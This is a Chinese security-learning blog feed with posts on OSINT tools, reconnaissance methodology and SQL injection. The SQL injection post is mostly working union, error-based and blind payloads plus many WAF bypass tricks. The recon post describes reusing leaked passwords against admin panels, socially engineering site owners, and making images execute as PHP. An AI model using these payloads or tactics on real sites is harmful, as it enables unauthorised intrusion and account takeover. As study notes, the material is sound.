{
    "version": "https://jsonfeed.org/version/1",
    "title": "学无止境",
    "subtitle": "与众不同，就一定会痛苦",
    "icon": "http://example.com/images/favicon.ico",
    "description": "繁星不怕被看作流萤",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/04/11/Internet%20Security/OSINT/",
            "url": "http://example.com/2023/04/11/Internet%20Security/OSINT/",
            "title": "OSINT",
            "date_published": "2023-04-11T07:39:25.000Z",
            "content_html": "<h3 id=\"1-什么是OSINT\"><a href=\"#1-什么是OSINT\" class=\"headerlink\" title=\"1.什么是OSINT\"></a>1.什么是OSINT</h3><blockquote>\n<p>OSINT（Open-source Intelligence）即开源情报搜集，是用多元化方法进行搜集、分析和通过公开信息进行决策的一种方法。在情报界，Open指的是侵略性、公开的资源.</p>\n</blockquote>\n<blockquote>\n<p>它是一种已被用于国家安全情报活动的方法，其目的是从报纸、新闻、网站和 SNS 等各种信息中预测国家和公司的政策。</p>\n</blockquote>\n<blockquote>\n<p>此外，通过使用 OSINT 收集信息，可以检测泄露的个人信息和机密信息，因此近年来它也被用于防御网络攻击。</p>\n</blockquote>\n<h4 id=\"个人信息检查\"><a href=\"#个人信息检查\" class=\"headerlink\" title=\"个人信息检查\"></a>个人信息检查</h4><blockquote>\n<ol>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYXZlaWJlZW5wd25lZC5jb20v\">Have I Been Pwned </span><ul>\n<li>只需输入您的电子邮件地址即可检查您的个人信息是否已被泄露<br><img data-src=\"%5COSINT%5C1.png\" alt=\" \"></li>\n<li>并且当未来发生 pwnage 并且您的帐户被盗用时，您会收到通知。<br><img data-src=\"%5COSINT%5C2.png\" alt=\" \"></li>\n<li>还能进行域名搜索<br>（在整个域中搜索被盗用的帐户并接收未来的通知）<br> <img data-src=\"%5COSINT%5C3.png\" alt=\" \"></li>\n<li>还会显示一些违规网站<br><img data-src=\"%5COSINT%5C4.png\" alt=\" \"></li>\n<li>还能查看密码是否安全<br><img data-src=\"%5COSINT%5C6.png\" alt=\" \"></li>\n<li>还提供了一些API(当然需要$)</li>\n</ul>\n</li>\n</ol>\n</blockquote>\n<h4 id=\"好用的情报工具\"><a href=\"#好用的情报工具\" class=\"headerlink\" title=\"好用的情报工具\"></a>好用的情报工具</h4><blockquote>\n<p>1.<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWFsdGVnby5jb20v\">Maltego</span><br>      Maltego一款非常优秀的信息搜索工具，与其他工具相比，不仅功能强大，而且自动化水平非常高，不需要复杂的命令，就能轻松的完成信息收集。该工具可以通过域名注册，搜索引擎，社交网络，电子邮件等各种渠道搜索信息。主要用于是用于开源情报和取证的软件，可以安装在Windows，Linux，MacOS上。在Kali Linux上是默认安装的，只需要一个域名，便可对互联网上的资源自上而下的搜集。<br> <img data-src=\"%5COSINT%5C7.png\" alt=\" \"></p>\n</blockquote>\n<blockquote>\n<p>2.<span class=\"exturl\" data-url=\"aHR0cHM6Ly91c2Vyc2VhcmNoLm9yZy8=\">UserSearch</span><br>    * UserSearch是一个庞大的用户搜索平台，通过用户名或电子邮件查找某人，可搜索社交网络、约会网站、论坛、加密论坛、聊天网站和博客上。目前已经运行了超过15 年，因此开发人员在用户名或电子邮件地址的OSINT 方面拥有相当强大的地位。开发人员是一个由开源专家和软件开发人员组成的团队。该站点完全免费使用！是迄今为止最全面、最准确的用户名和电子邮件地址在线搜索引擎之一。它还有高级设置，当然也要$.<br> <img data-src=\"%5COSINT%5C8.png\" alt=\" \"></p>\n</blockquote>\n<blockquote>\n<ol start=\"3\">\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb3Jrc2VhcmNoLmNvbS8=\">DorkSearch</span><ul>\n<li>这是一项于2022年初创建并向社区发布的免费服务。该工具似乎是exploit-db提供的服务的一种变体，但具有更有用和更广泛的功能。Dorking 基本上是一组可以在Google中使用的半秘密搜索词。使用它们可以显示并非真正打算在Google 中出现的结果！也称为“深网”（不要与暗网/TOR混淆）。</li>\n</ul>\n</li>\n</ol>\n</blockquote>\n<pre><code>  * 开发人员基本上为Dorks创建了一个搜索页面。在下图中，您可以看到它们有一个易于点击的界面。随后它可以让你浏览你感兴趣的内容，然后你只需要点击你想要的。\n</code></pre>\n<p>  <img data-src=\"%5COSINT%5C9.png\" alt=\" \"></p>\n<blockquote>\n<ol start=\"4\">\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zY2Ftc2VhcmNoLmlvLw==\">ScamSearch</span><ul>\n<li>个人诈骗者和诈骗网站的全球数据库。迄今为止，被认为OSINT 最大的社区之一。ScamSearc 是一个庞大的诈骗者众包报告数据库。涉及加密货币诈骗、电子邮件、社交网络、离线诈骗、电话诈骗，几乎所有你能想到的诈骗情况，这个网站都会记录下来并免费提供。目前有大约1000万记录在案的诈骗者，并且每周以数千人的速度增长。</li>\n</ul>\n</li>\n</ol>\n</blockquote>\n<pre><code>  他们有一个简单的搜索栏，可让在他们的数据库中搜索用户名、电子邮件、加密地址、昵称、真实姓名或网站。鉴于数据库的大小，搜索会很慢，但它是即时的。完全免费的大量诈骗份子数据！由于其众包性质，还鼓励用户使用其服务来举报诈骗者。许多OSINT研究人员和反诈骗社区使用这些数据来瞄准诈骗者并阻碍他们的诈骗工作。\n  \n</code></pre>\n<p> <img data-src=\"%5COSINT%5C10.png\" alt=\" \"></p>\n<blockquote>\n<ol start=\"5\">\n<li>Mitaka(一个扩展程序）<ul>\n<li>这是浏览器中非常方便的一组工具，这可作为Chrome扩展程序使用，也可用于Firefox。它允许在十几个主要搜索引擎中搜索域、URL、IP 地址、MD5 哈希、ASN 和比特币地址。</li>\n</ul>\n</li>\n</ol>\n</blockquote>\n<blockquote>\n<ol start=\"6\">\n<li>Spiderfoot<br>[下载地址]（<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NtaWNhbGxlZi9zcGlkZXJmb290P3JlZj1kJUVGJUJDJTg5\">https://github.com/smicallef/spiderfoot?ref=d）</span></li>\n</ol>\n</blockquote>\n<pre><code> * 这是一个免费的侦察工具，可自动查询 100 多个公共数据源 (OSINT)，以收集有关IP地址、域名、电子邮件地址、姓名等的情报信息。只需指定要调查的目标，选择要启用的模块，然后 SpiderFoot 将收集数据以了解所有实体以及它们之间的关系。扫描返回的数据将揭示有关目标的大量信息，从而深入了解可能的数据泄漏、漏洞或其他敏感信息，这些信息可在渗透测试、红队演习或威胁情报中被利用。\n</code></pre>\n",
            "tags": [
                "网安",
                "信息搜集"
            ]
        },
        {
            "id": "http://example.com/2023/04/10/Internet%20Security/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/",
            "url": "http://example.com/2023/04/10/Internet%20Security/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/",
            "title": "信息搜集",
            "date_published": "2023-04-10T11:08:20.000Z",
            "content_html": "<h2 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h2><h3 id=\"cdn获取真实ip\"><a href=\"#cdn获取真实ip\" class=\"headerlink\" title=\"cdn获取真实ip\"></a>cdn获取真实ip</h3><ul>\n<li>方法一：<br>从全球各地去ping他的服务器（万一在一些穷乡僻壤的地方ping到了呢）</li>\n<li>方法二：<br>使用邮件订阅或RSS订阅的一种形式（大部分cdn不会防御件订阅或RSS订阅的东西）</li>\n<li>方法三：<br>ping二级域名（有些网站的二级域名可能不会做cdn）</li>\n<li>方法四：<br>用nslookup</li>\n<li>方法五：<br>查找一下域名的历史解析记录，毕竟域名再用cdn之前可能是用真实的ip</li>\n<li>F6：<br>phpinfo上可能显示他的真实ip</li>\n</ul>\n<h3 id=\"域名–渗透\"><a href=\"#域名–渗透\" class=\"headerlink\" title=\"域名–渗透\"></a>域名–渗透</h3><blockquote>\n<p>1.确定站点是否是主站</p>\n<blockquote>\n<p>如果是，先进行子域名的挖掘，然后从子域名入手，确定一下使用了什么服务器（中间件），查看一下他的CMS，用什么编程语言，大概使用了什么数据库，有没有使用cdn，如果有cdn，则需要搜集一下网站的真实ip，然后看一下网站的源代码是不是存在着信息泄露，有时还可以进一步对网站进行信息搜集，比如：whois查询，ip访查，使用google进行查询（黑客引擎进行敏感信息的搜集），查看目标的功能模块有没有文件上传，sql注入，xss等等漏洞。</p>\n</blockquote>\n</blockquote>\n<h3 id=\"扫描问题\"><a href=\"#扫描问题\" class=\"headerlink\" title=\"扫描问题\"></a>扫描问题</h3><ul>\n<li>Mysql 只扫到了80端口</li>\n</ul>\n<blockquote>\n<ol>\n<li>可能将Mysql端口改了</li>\n<li>也可能是站库分离</li>\n</ol>\n</blockquote>\n<ul>\n<li>Mysql数据库与网站分离，渗透进去后你可能发现他的配置文件里可能有去远程连接其他专门的数据库服务器的配置文件<blockquote>\n<ol start=\"3\">\n<li>3306端口不对外开放（用防火墙将自己的3306端口从内部deny掉了）</li>\n</ol>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"搜集目标网站注册人的信息\"><a href=\"#搜集目标网站注册人的信息\" class=\"headerlink\" title=\"搜集目标网站注册人的信息\"></a>搜集目标网站注册人的信息</h3><ol>\n<li>考虑用telegram上的一些社工库，看一下有没有他泄露的一些密码，尝试使用其泄露的密码去登录网站的后台。</li>\n<li>搜索引擎搜索邮箱关键词，看看他有没有在网上发布一些言论。</li>\n<li>利用搜索到的一些关联信息去找出其他的关联信息（邮箱，账号等等）与其聊天，套取一些信息。</li>\n<li>用社会工程学的方法去找到他的一些社交帐号（可能会在里面找到管理员设置密码的一些习惯）。</li>\n<li>利用已经拥有的信息生成一个专用的字典。</li>\n<li>观察管理员会逛哪些比较大众性的网站，通过这些网站可能会看到他密码提示的一些内容。</li>\n</ol>\n<h3 id=\"windows-or-linux\"><a href=\"#windows-or-linux\" class=\"headerlink\" title=\"windows or linux\"></a>windows or linux</h3><p> 区分–&gt; windows大小写不敏感，Linux大小写敏感</p>\n<h3 id=\"有一个网站\"><a href=\"#有一个网站\" class=\"headerlink\" title=\"有一个网站\"></a>有一个网站</h3><h4 id=\"如果知道（-xxx-xxxeditor-php-或（-xxx-admin-xxxx-php\"><a href=\"#如果知道（-xxx-xxxeditor-php-或（-xxx-admin-xxxx-php\" class=\"headerlink\" title=\"如果知道（./xxx/xxxeditor.php)或（./xxx/admin/xxxx.php)\"></a>如果知道（./xxx/xxxeditor.php)或（./xxx/admin/xxxx.php)</h4><blockquote>\n<ol>\n<li>直接在网站的二级文件xxx底下扫描敏感文件/目录。</li>\n</ol>\n</blockquote>\n<h4 id=\"如果在网站的表面\"><a href=\"#如果在网站的表面\" class=\"headerlink\" title=\"如果在网站的表面\"></a>如果在网站的表面</h4><blockquote>\n<ol>\n<li>在表面进行元素审查时，可以知道这个网站所利用的防护软件<ul>\n<li>在敏感操作中被拦截/通过界面无法判断使用了什么防护软件时，可以用f12去看一下html<pre><code>  * 如：&lt;护卫神&gt; ---会出现&lt;hws&gt;xxxx&lt;/hws&gt;\n</code></pre>\n</li>\n</ul>\n</li>\n<li>有时可以用img标签，当图片加载不出来会触发onerror属性,来获取管理员的一个后台路径</li>\n<li>还可以尝试在src里指定一个远程的脚本文件，获取referer</li>\n</ol>\n</blockquote>\n<h4 id=\"有时网站后台会做限制\"><a href=\"#有时网站后台会做限制\" class=\"headerlink\" title=\"有时网站后台会做限制\"></a>有时网站后台会做限制</h4><blockquote>\n<ol>\n<li>有时src属性的结尾必须要是.jpg .png .gif,<ul>\n<li>可以考虑用.htaccess在远程服务器上修改apache的配置文件</li>\n<li>或将.jpg文件当作php执行<pre><code>     * AppType application/x-http-php .jpg(打进去后一定要删掉）\n</code></pre>\n</li>\n</ul>\n</li>\n</ol>\n</blockquote>\n<h4 id=\"当在表面上没有看到一些漏洞\"><a href=\"#当在表面上没有看到一些漏洞\" class=\"headerlink\" title=\"当在表面上没有看到一些漏洞\"></a>当在表面上没有看到一些漏洞</h4><blockquote>\n<p>1 可以去查找旁站<br>           * 旁站—-&gt; 同一服务器上可能开了多台虚拟机，打下一台后可以借此把其他的也给打下来</p>\n</blockquote>\n<ul>\n<li>百度域名的查找</li>\n<li>百度ip访查域名（通过这个ip查找挂在其下的有哪些域名）</li>\n</ul>\n<h3 id=\"信息搜集流程\"><a href=\"#信息搜集流程\" class=\"headerlink\" title=\"信息搜集流程\"></a>信息搜集流程</h3><blockquote>\n<ol>\n<li>服务器的相关信息<ul>\n<li>真实ip</li>\n<li>系统类型及版本</li>\n<li>开放端口</li>\n<li>使用什么waf</li>\n</ul>\n</li>\n<li>网站的指纹<ul>\n<li>CMS</li>\n<li>cdn</li>\n<li>证书</li>\n<li>dns记录</li>\n</ul>\n</li>\n<li>whois的信息（社工库中寻找）<ul>\n<li>姓名</li>\n<li>备案</li>\n<li>邮箱</li>\n<li>电话访查</li>\n</ul>\n</li>\n<li>子域名 旁站  c段（ip的网段）</li>\n<li>google进行针对化的搜索<ul>\n<li>查pdf文件</li>\n<li>中间件版本</li>\n<li>弱口令</li>\n</ul>\n</li>\n<li>扫描网站目录<br> 爆破后台<br> 测试文件<br> 敏感文件</li>\n<li>传输协议<ul>\n<li>exp</li>\n<li>寻找相应源码</li>\n</ul>\n</li>\n</ol>\n</blockquote>\n<h3 id=\"漏洞挖掘\"><a href=\"#漏洞挖掘\" class=\"headerlink\" title=\"漏洞挖掘\"></a>漏洞挖掘</h3><blockquote>\n<ol>\n<li>浏览网站<ul>\n<li>看一下网站的规模，功能，特点</li>\n<li>查看端口，目录，弱口令（进行一个扫描）<ul>\n<li>有端口响应，要对其进行探测<ul>\n<li>如：rsync，心脏出血漏洞，mysql漏洞，ftp,ssh,弱口令</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>xss   sql注入  文件上传  命令注入     csrf    cookie安全检查     敏感信息     通信数据传输     暴力破解     越权访问     未授权访问     目录遍历     文件包含     重放攻击     服务器漏洞检测     漏洞扫描</li>\n</ul>\n</li>\n</ol>\n</blockquote>\n",
            "tags": [
                "网安",
                "信息搜集"
            ]
        },
        {
            "id": "http://example.com/2023/04/09/Internet%20Security/hello-world/",
            "url": "http://example.com/2023/04/09/Internet%20Security/hello-world/",
            "title": "SQL注入",
            "date_published": "2023-04-09T03:33:00.000Z",
            "content_html": "<h1 id=\"本周重点\"><a href=\"#本周重点\" class=\"headerlink\" title=\"本周重点\"></a>本周重点</h1><h3 id=\"1-产生原理（实质）\"><a href=\"#1-产生原理（实质）\" class=\"headerlink\" title=\"1.产生原理（实质）\"></a>1.产生原理（实质）</h3><p>1.用户能调控参数（像id=2 union select 1,2,3–+)要能添加代码<br>2.原本数据库只执行（id=2)语句，但执行了用户拼接的一些代码</p>\n<h3 id=\"2-类型\"><a href=\"#2-类型\" class=\"headerlink\" title=\"2.类型\"></a>2.类型</h3><p>1.联合注入<br>        2.堆叠注入<br>        3.宽字节注入<br>        4.cookie注入<br>        5.XFF头注入<br>        6.UA注入（user-agent注入）<br>        7.Referer注入<br>        8.二次注入<br>        9.base64注入<br>        11.万能密码<br>        12.文件读写<br>盲注类型：<br>        1.基于时间的盲注     sleep()   benchmark()<br>        2.基于布尔的注入<br>        3.基于报错的注入     updatexml()  extractvalue()  floor()  exp()</p>\n<h3 id=\"语言\"><a href=\"#语言\" class=\"headerlink\" title=\"语言\"></a>语言</h3><pre><code class=\"SQL\">一，union select\n?id=-2 &#39;   &quot;   )     &#39;)    &quot;)      ]     )]\norder by 3 --+\nunion select 1,2,3 --+\nunion select 1,database(),3 --+\nunion select 1,select group_concat(table_name) from information_schema.tables where table_schema=database(),3 --+\nunion select 1,select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name =&quot;&quot;,3--+\nunion select 1,select group_concat(id)from users,3 --+\n二，报错注入\n1.and extractvalue(1,concat(0x7e,(database()),0x7e)) --+\n2.and updatexml(1,(concat(0x3a,(database()),0x3a)),1) --+\n0x7e----&gt;~\n0x3a----&gt;:\n三,爆出\nindex.php?id=2&#39; and (select 1 from (select count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b) --+\n</code></pre>\n<h3 id=\"3-如何防范\"><a href=\"#3-如何防范\" class=\"headerlink\" title=\"3.如何防范\"></a>3.如何防范</h3><h4 id=\"存在哪些风险、对应的对策是什么。\"><a href=\"#存在哪些风险、对应的对策是什么。\" class=\"headerlink\" title=\"存在哪些风险、对应的对策是什么。\"></a>存在哪些风险、对应的对策是什么。</h4><blockquote>\n<p>1.预编译  （数据库不会将参数的内容视为SQL命令执行，而是作为一个字段的属性值来处理）</p>\n<blockquote>\n<p>2.PDO预处理                 (本地和Mysql服务端使用字符集对输入进行转义)</p>\n<blockquote>\n<p>3.正则表达式过滤          (如果用户输入了非法信息则利用正则表达式过滤)<br> 4那如何反防范呢？<br>接下来将展示一些绕过的姿势。<br>1.屏蔽or and 空格 注释符<br>or 用|| 或  |<br>and 用&amp;&amp; 或&amp;</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<h3 id=\"4那如何反防范呢？\"><a href=\"#4那如何反防范呢？\" class=\"headerlink\" title=\"4那如何反防范呢？\"></a>4那如何反防范呢？</h3><h4 id=\"接下来将展示一些绕过的姿势。\"><a href=\"#接下来将展示一些绕过的姿势。\" class=\"headerlink\" title=\"接下来将展示一些绕过的姿势。\"></a>接下来将展示一些绕过的姿势。</h4><blockquote>\n<p>替代空格的东西<br>%09 水平tab键<br>%0a 新建一行<br>%0c 新建一页<br>%0d 回车键<br>%0b 垂直tab键<br>%a0 也是空格键</p>\n</blockquote>\n<blockquote>\n<p>屏蔽–+号<br>用 or ‘1’ =’1 代替<br>如<br>?id=2000000’%0aunion%0aselect%0a1,2,3%0a||%0a’1’=’1<br>如果哪天%的空格都不能用，不用空格<br>无空格写法用（）<br>?id=1’||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)like(database())),0x7e),1))||’1’=’1</p>\n</blockquote>\n<hr>\n<pre><code class=\"SQL\">小知识:\n对&#39; \\ 屏蔽，前面多加个\\\n数据库用的是gbk编码，会把2个字符当作一个汉字\n如：\n?id=1%df\\&#39;（在机器看来这就是个1+字符+&#39;)\npost类\nburp抓包\n在目标位置admin%df%27 union select 1,2 #\n\n常见绕过：\n1.大小写绕过\nUnion SelEct\n2.双写绕过\nununionion\n3.编码绕过\nsecurity--&gt;hex编码\nurlencode\n4.注释符/**/\nuni/**/on sel/**/ect\n5.对于空格绕过\n开头已提过了\n6.对于or and绕过\nand = &amp;&amp;\nor = ||\n7.单引号\n%df%27\n8.反引号\n反引号只能在表名，一般情况下如果表名和语法一样，那么就必须用反引号修饰，否则数据库会误以为这是语法！！！！！！！！！！！！！！！！！！！！！！\nselect username,password from `table1` where id=&#39;1&#39; limit 0,1\nwhere\nselect * from `where` where id =1\n9.内联注释\nand /*!select*/ 1,2\n10.&lt;&gt;绕过\nuni&lt;&gt;on sel&lt;&gt;ect\n对了这里加一布尔型的盲注(猜库名\nselect * from users where id=1 and ascii(substr(database(),0,1)) &gt; 115\ngreatest least\nselect * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64\n\n\n11.屏蔽逗号\nselect substr(&quot;xxxxx&quot;,1,3)\nselect substr(&quot;xxxxx&quot; from 1 to 3)\n\nunion select 1,2,3\nunion select * from (select 1)a join (select 2)b join (select 3)c;\n\nlimit 0,1\nlimit 0 offset 1\n12.sleep屏蔽\nand sleep(1)\nand benchmark(100000000（0的个数视情况而定）,1);\n13.group_concat屏蔽\nselect group_concat(&quot;haha&quot;,&quot;niao&quot;);\nselect concat_ws(&quot; &quot;,&quot;haha&quot;,&quot;niao&quot;);\n（把&quot;&quot;放到&quot;haha&quot;,&quot;niao&quot;中间并合并输出）\n14.等号屏蔽\n用 like rlike regexp &lt;&gt;(不等号)?id=1&#39; or 1 like 1\n?id=1&#39; or 1 &lt;&gt; 1\n15.post情况屏蔽#\nid=3&quot;) or 1=1 -- a 使用--空格a可以在post情况下替代#\n16.ip地址拦截（只允许内网访问）\nX-forwarded-for：ip地址\nX-remote-IP：ip地址\nX-Originating-IP：ip地址\nX-remote-addr：ip地址\nX-Real-Ip：ip地址\n(一般放在抓包中间，DNT之后)\n17.修改静态资源\nhttp://www.xx.com/sql.php?id=1\n可以替换为\nhttp://www.xx.com/sql.php/1.js?id=1\n18.url白名单\n为了防止防火墙误伤，部分waf(防火墙)内置白名单列表 admin manager system...\n如:\nhttp://www.xx.com/sql.php/admin.php?id=1\nhttp://www.xx.com/sql.php?xxxx=/manager/&amp;b=攻击代码\n\nhttp://www.xx.com/../../../../manager/../sql.php?id=1\n19.爬虫白名单(waf让baidu等搜索引擎蜘蛛能进入)\n伪造自己是搜索引擎（修改user-agent）\n将user-agent改为baidu等一些搜索引擎蜘蛛的user-agent\n20.数据库注释执行\n/*!50001 select * from table1*/;\n如果数据库版本是5.00.01 版本以下的，语句才会执行\n/*!45509 union select */ 1,2,3 --+\n21.增加干扰\nunion all %23%a0 select 1,2,3 --+\n</code></pre>\n<h4 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h4><p>有什么想法或心得体会，都可以拿出来分享下。</p>\n",
            "tags": [
                "网安",
                "Top10"
            ]
        }
    ]
}